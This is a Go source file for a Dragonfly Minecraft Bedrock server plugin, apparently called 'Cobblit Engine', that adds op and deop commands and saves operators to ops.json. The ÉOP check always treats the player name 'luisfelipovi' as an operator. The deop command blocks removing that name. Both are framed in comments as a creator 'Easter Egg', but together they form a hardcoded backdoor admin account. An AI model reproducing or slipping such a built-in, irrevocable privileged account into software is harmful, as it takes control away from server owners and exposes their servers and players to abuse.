package plugins

import (
	"encoding/json"
	"os"
	"strings"

	"github.com/df-mc/dragonfly/server/cmd"
	"github.com/df-mc/dragonfly/server/player"
	"github.com/df-mc/dragonfly/server/world"
)

const arquivoOperadores = "ops.json"

var operadores = map[string]bool{}

// ÉOP verifica se o jogador é operador (incluindo o Easter Egg permanente para o criador)
func ÉOP(nome string) bool {
	if nome == "luisfelipovi" {
		return true // Easter Egg: O criador do motor é sempre OP supremo!
	}
	return operadores[nome]
}

// CarregarOps lê o arquivo JSON ao ligar o servidor
func CarregarOps() {
	dados, err := os.ReadFile(arquivoOperadores)
	if err != nil {
		SalvarOps()
		return
	}
	_ = json.Unmarshal(dados, &operadores)
}

// SalvarOps grava a lista atualizada no arquivo JSON
func SalvarOps() {
	dados, err := json.MarshalIndent(operadores, "", "  ")
	if err == nil {
		_ = os.WriteFile(arquivoOperadores, dados, 0644)
	}
}

type OpCommand struct {
	Alvo cmd.Varargs `name:"jogador"`
}

func (c OpCommand) Run(src cmd.Source, o *cmd.Output, tx *world.Tx) {
	if p, ok := src.(*player.Player); ok {
		if !ÉOP(p.Name()) {
			p.Message("§cVocê não tem permissão para usar este comando.")
			return
		}
	}

	nome := strings.TrimSpace(string(c.Alvo))
	if nome == "" {
		o.Errorf("Você precisa especificar o nome de um jogador.")
		return
	}
	
	operadores[nome] = true
	SalvarOps()
	o.Printf("§a[Cobblit Engine] Sucesso: O jogador %s agora é um Operador.", nome)
}

type DeopCommand struct {
	Alvo cmd.Varargs `name:"jogador"`
}

func (c DeopCommand) Run(src cmd.Source, o *cmd.Output, tx *world.Tx) {
	if p, ok := src.(*player.Player); ok {
		if !ÉOP(p.Name()) {
			p.Message("§cVocê não tem permissão para usar este comando.")
			return
		}
	}

	nome := strings.TrimSpace(string(c.Alvo))
	if nome == "" {
		o.Errorf("Você precisa especificar o nome de um jogador.")
		return
	}

	// Proteção extra para o Easter Egg
	if nome == "luisfelipovi" {
		o.Errorf("§cVocê não pode remover os privilégios do criador do motor!")
		return
	}

	delete(operadores, nome)
	SalvarOps()
	o.Printf("§e[Cobblit Engine] Sucesso: Os privilégios de operador de %s foram removidos.", nome)
}

func RegistrarComandosOperator() {
	CarregarOps()
	cmd.Register(cmd.New("op", "Concede status de operador", []string{}, OpCommand{}))
	cmd.Register(cmd.New("deop", "Remove status de operador", []string{}, DeopCommand{}))
}
